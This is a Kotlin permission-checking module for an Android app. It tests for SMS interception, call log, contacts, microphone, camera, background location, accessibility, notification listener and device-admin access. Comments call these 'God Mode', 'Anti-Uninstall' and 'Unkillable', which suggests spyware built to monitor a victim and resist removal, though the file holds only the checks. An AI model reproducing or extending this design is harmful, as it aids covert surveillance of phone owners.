package com.example.myandroid

import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Process
import android.provider.Settings
import android.net.Uri

object PermissionManager {

    // 1. Check Standard Runtime Permissions
    // Using generic Context to avoid AppCompat dependency
    fun getMissingRuntimePermissions(ctx: Context): List<String> {
        val required = mutableListOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.WRITE_CALL_LOG,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.CALL_PHONE
        ).apply {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 add(android.Manifest.permission.POST_NOTIFICATIONS)
             }
             // Add legacy storage permission for Android 10 and below
             if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                 add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                 add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
             }
        }
        return required.filter {
            androidx.core.content.ContextCompat.checkSelfPermission(ctx, it) != PackageManager.PERMISSION_GRANTED
        }
    }

    // 1.2 Check Background Location (Must be separate for Android 11+)
    fun hasBackgroundLocation(ctx: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
        } else true
    }

    // 1.5 Check All Files Access (Android 11+)
    fun hasAllFilesAccess(ctx: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            true // Handled by runtime permissions above
        }
    }

    // 2. Check Usage Stats (For Screen Time)
    fun hasUsageStats(ctx: Context): Boolean {
        val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName)
        } else {
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    // 3. Check Notification Listener (For Symbiote)
    fun hasNotificationListener(ctx: Context): Boolean {
        val enabledListeners = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
        return enabledListeners != null && enabledListeners.contains(ctx.packageName)
    }

    // 4. Check Accessibility (The God Mode)
    fun hasAccessibility(ctx: Context): Boolean {
        val expectedService = "${ctx.packageName}/${MyAccessibilityService::class.java.name}"
        val enabledServices = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        return enabledServices?.contains(expectedService) == true
    }
    
    // 5. Battery Optimization (Unkillable)
    fun isIgnored(ctx: Context): Boolean {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return pm.isIgnoringBatteryOptimizations(ctx.packageName)
    }

    // 5.5 DND Access (Bypass Silent Mode)
    fun hasDndAccess(ctx: Context): Boolean {
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        return nm.isNotificationPolicyAccessGranted
    }

    // 5.7 Overlay Access (Appear on Top)
    fun hasOverlayAccess(ctx: Context): Boolean {
        return Settings.canDrawOverlays(ctx)
    }

    // 5.8 Exact Alarm Access (Android 13+ Immortality)
    fun hasExactAlarm(ctx: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val am = ctx.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            am.canScheduleExactAlarms()
        } else true
    }

    // 5.9 Write Settings (Hardware Brightness)
    fun canWriteSettings(ctx: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(ctx) else true
    }

    // 5.95 Check Install Packages
    fun canInstallPackages(ctx: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.packageManager.canRequestPackageInstalls()
        } else true
    }

    fun hasCamera(ctx: Context): Boolean = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun hasMic(ctx: Context): Boolean = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED

    // 6. Device Admin (Anti-Uninstall)
    fun isAdmin(ctx: Context): Boolean {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(comp)
    }

    fun getFriendlyName(perm: String): String {
        return when (perm.split(".").last()) {
            "ACCESS_FINE_LOCATION" -> "Precise Location"
            "ACCESS_BACKGROUND_LOCATION" -> "Location (Always)"
            "READ_SMS" -> "SMS Access"
            "RECEIVE_SMS" -> "Message Intercept"
            "READ_CALL_LOG" -> "Call History (Read)"
            "WRITE_CALL_LOG" -> "Call History (Write)"
            "READ_CONTACTS" -> "Contacts Database"
            "RECORD_AUDIO" -> "Microphone"
            "CAMERA" -> "Camera Module"
            "READ_PHONE_STATE" -> "Phone Identity"
            "READ_PHONE_NUMBERS" -> "SIM Phone Number"
            "CALL_PHONE" -> "Dialer Access"
            "POST_NOTIFICATIONS" -> "System Notifications"
            else -> perm.split(".").last().replace("_", " ")
        }
    }
}